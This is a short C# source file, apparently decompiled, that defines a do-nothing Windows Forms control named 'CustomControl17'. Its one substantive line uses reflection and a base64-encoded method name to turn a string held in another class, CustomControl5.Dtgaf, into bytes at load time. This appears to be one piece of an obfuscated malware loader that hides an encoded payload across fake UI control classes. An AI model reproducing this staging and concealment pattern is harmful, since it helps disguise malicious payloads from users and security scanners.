using System;
using System.ComponentModel;
using System.Text;
using System.Windows.Forms;

namespace perti;

public class CustomControl17 : Control
{
	internal delegate byte[] EncGetBytes(string data);

	internal static readonly byte[] Sdrf = ((EncGetBytes)Delegate.CreateDelegate(typeof(EncGetBytes), Encoding.Default, typeof(Encoding).GetMethod(CustomControl36.Def(CustomControl4.D("R2V0Qnl0ZXM=")), new Type[1] { typeof(string) })))(CustomControl5.Dtgaf);

	private IContainer components;

	public CustomControl17()
	{
		InitializeComponent();
	}

	protected override void OnPaint(PaintEventArgs pe)
	{
		((Control)this).OnPaint(pe);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Control)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
	}
}
